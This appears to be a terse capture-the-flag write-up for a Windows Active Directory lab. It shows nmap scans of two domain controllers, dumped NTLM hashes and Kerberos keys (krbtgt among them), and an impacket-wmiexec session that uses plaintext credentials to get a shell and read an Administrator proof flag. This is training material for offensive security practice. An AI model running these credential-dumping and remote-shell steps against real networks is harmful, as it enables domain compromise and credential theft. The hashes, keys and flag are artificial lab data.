

brief `A lab that tests your ability to identify and exploit known vulnerabilities in Windows Server environments. You will need to apply your skills in reconnaissance, enumeration, and lateral movement techniques to compromise the target Domain Controller and obtain sensitive information.`

## RECON 

```sql

# eggshell 

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-08-12 14:47:53Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: lab.secdojo.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds      Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: LAB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: lab.secdojo.local, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LAB
|   NetBIOS_Domain_Name: LAB
|   NetBIOS_Computer_Name: SRV-DC1
|   DNS_Domain_Name: lab.secdojo.local
|   DNS_Computer_Name: srv-dc1.lab.secdojo.local
|   DNS_Tree_Name: lab.secdojo.local
|   Product_Version: 10.0.14393
|_  System_Time: 2024-08-12T14:48:48+00:00
| ssl-cert: Subject: commonName=srv-dc1.lab.secdojo.local
| Not valid before: 2024-08-11T14:34:05
|_Not valid after:  2025-02-10T14:34:05
|_ssl-date: 2024-08-12T14:49:22+00:00; +1s from scanner time.
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-08-12T14:49:22+00:00; +1s from scanner time.
|_http-title: Not Found
| ssl-cert: Subject: commonName=SRV-DC1
| Subject Alternative Name: DNS:SRV-DC1, DNS:srv-dc1.lab.secdojo.local
| Not valid before: 2020-07-23T16:30:59
|_Not valid after:  2023-07-23T16:30:59
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49678/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc             Microsoft Windows RPC
49683/tcp open  msrpc             Microsoft Windows RPC
49704/tcp open  msrpc             Microsoft Windows RPC
49782/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: SRV-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2024-08-12T14:48:47
|_  start_date: 2024-08-12T14:34:13
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
|_nbstat: NetBIOS name: SRV-DC1, NetBIOS user: <unknown>, NetBIOS MAC: 00ffc07f4ece (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: srv-dc1
|   NetBIOS computer name: SRV-DC1\x00
|   Domain name: lab.secdojo.local
|   Forest name: lab.secdojo.local
|   FQDN: srv-dc1.lab.secdojo.local
|_  System time: 2024-08-12T14:48:44+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.66 seconds

CAUGHT-LOCAL
```

```sql 

# caught

Nmap scan report for 10.8.0.2
Host is up (0.24s latency).
Not shown: 41054 closed tcp ports (reset), 24461 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds      Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: caught-local)
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=Caught.caught.local
| Not valid before: 2024-05-26T13:55:18
|_Not valid after:  2024-11-25T13:55:18
|_ssl-date: 2024-08-12T14:49:03+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: caught-local
|   NetBIOS_Domain_Name: caught-local
|   NetBIOS_Computer_Name: CAUGHT
|   DNS_Domain_Name: caught.local
|   DNS_Computer_Name: Caught.caught.local
|   DNS_Tree_Name: caught.local
|   Product_Version: 10.0.14393
|_  System_Time: 2024-08-12T14:48:57+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
47001/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc             Microsoft Windows RPC
49665/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  msrpc             Microsoft Windows RPC
49674/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc             Microsoft Windows RPC
49678/tcp open  msrpc             Microsoft Windows RPC
49684/tcp open  msrpc             Microsoft Windows RPC
49698/tcp open  msrpc             Microsoft Windows RPC
49709/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: CAUGHT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: Caught
|   NetBIOS computer name: CAUGHT\x00
|   Domain name: caught.local
|   Forest name: caught.local
|   FQDN: Caught.caught.local
|_  System time: 2024-08-12T14:48:55+00:00
| smb2-time: 
|   date: 2024-08-12T14:48:56
|_  start_date: 2024-08-12T14:34:37
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: CAUGHT, NetBIOS user: <unknown>, NetBIOS MAC: 00ff918d26f1 (unknown)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

# SRV-DC1

```


got some hashes here 

```sql 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a6cf4e66d7fba60a999debe07bc31a5d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:164c2c62baca5631306fa88d1a603c8e:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab.secdojo.local\NGuillaume:1111:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab.secdojo.local\AFabre:1112:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab.secdojo.local\MRoger:1113:aad3b435b51404eeaad3b435b51404ee:58cd7d4dd5bd4960886ebc9cf1face6f:::
lab.secdojo.local\ACarpentier:1114:aad3b435b51404eeaad3b435b51404ee:52c8d886ffec5ffdcab4b87fe01c8c60:::
lab.secdojo.local\LFernandez:1115:aad3b435b51404eeaad3b435b51404ee:218dc58a57a6a7356391f7e9f011f148:::
lab.secdojo.local\NGaillard:1116:aad3b435b51404eeaad3b435b51404ee:bea555a433f01d87b3bd7ce996f30ee3:::
lab.secdojo.local\SRoger:1117:aad3b435b51404eeaad3b435b51404ee:8ce299904b8f7191db102ba45368f96d:::
lab.secdojo.local\AGarnier:1118:aad3b435b51404eeaad3b435b51404ee:7b587ddc1f3adc5bb9e38f175945228d:::
lab.secdojo.local\LCharles:1119:aad3b435b51404eeaad3b435b51404ee:19a9b96209b98e81683c662dd0da47fb:::
lab.secdojo.local\EColin:1120:aad3b435b51404eeaad3b435b51404ee:45b23664f2bc6c6e47093322ca75bba6:::
lab.secdojo.local\TRey:1121:aad3b435b51404eeaad3b435b51404ee:2314f0a305e4b4c0045d76af972d0976:::
lab.secdojo.local\JRobin:1122:aad3b435b51404eeaad3b435b51404ee:cde3911f0cc03775417cbf34b8099067:::
lab.secdojo.local\TNoel:1123:aad3b435b51404eeaad3b435b51404ee:74e3b616e89d30ac5a7570850f18feca:::
lab.secdojo.local\GDa Silva:1124:aad3b435b51404eeaad3b435b51404ee:f17360ce35cb1f80db51f61d3984fab1:::
lab.secdojo.local\LPetit:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SRV-DC1$:1008:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CLIENT$:1436:aad3b435b51404eeaad3b435b51404ee:0e3dee16508387d9e89ddbbc228ea6ed:::
caught-local$:2109:aad3b435b51404eeaad3b435b51404ee:1f4c7713d3773235f2f48af247cf482b:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:0308583a7291f8097df337f36e87b596b9bf1b8385d4e5d9d5a49a88fc8daf56
krbtgt:aes128-cts-hmac-sha1-96:5202336f33011040d88a856ade8a8694
krbtgt:des-cbc-md5:e51a3ec26ee5e9c2
lab.secdojo.local\MRoger:aes256-cts-hmac-sha1-96:be20a49a25cae5a265d288894d9066065d4635411f8d14f117926758c30f52b1
SRV-DC1$:aes256-cts-hmac-sha1-96:7b849533654ae136cb7a7bf46dad851a54a78a7ce8834b7915e5c23f93a5d409
SRV-DC1$:aes128-cts-hmac-sha1-96:35fdd53dc5bf868f24efac54af8e2604
SRV-DC1$:des-cbc-md5:efe3451c2c452673
CLIENT$:aes256-cts-hmac-sha1-96:bf00f46b9b1a84d3721a5ee6ab218003f78beb1be13d69eb4ef35a899fc803d7
CLIENT$:aes128-cts-hmac-sha1-96:a2c365f40d0d61413a759357c025c1cf
CLIENT$:des-cbc-md5:0879b9d537b0a1e6
caught-local$:aes256-cts-hmac-sha1-96:c4d18ba022869a1ae3dcb1ef86d4b9d19abccb62663621aa56c0552ec5f5d1fd
caught-local$:aes128-cts-hmac-sha1-96:0ce083e520100bd5417d929d8be024cf
caught-local$:des-cbc-md5:b6cb0ba4e64c0401

```



```sql caught 

┌─[✗]─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/caught]
└──╼ $impacket-wmiexec caught.local/mainsvc:Password2010@10.8.0.2 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd \Users\Public\local.txt 
^[[AThe system cannot find the path specified.

C:\>cd \Users\Public\
C:\Users\Public>type local.txt
The system cannot find the file specified.

C:\Users\Public>dir
 Volume in drive C has no label.
 Volume Serial Number is 4296-F44D

 Directory of C:\Users\Public

09/12/2016  11:35 AM    <DIR>          .
09/12/2016  11:35 AM    <DIR>          ..
10/18/2016  01:59 AM    <DIR>          Documents
07/16/2016  01:23 PM    <DIR>          Downloads
07/16/2016  01:23 PM    <DIR>          Music
07/16/2016  01:23 PM    <DIR>          Pictures
07/16/2016  01:23 PM    <DIR>          Videos
               0 File(s)              0 bytes
               7 Dir(s)  10,013,261,824 bytes free

C:\Users\Public>ls -la
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Public>type \Users\Administrator\Desktop\proof.txt
caught_group_14789-m3gho72zhltwl0j6pml85mom0l5ukflv

C:\Users\Public>


```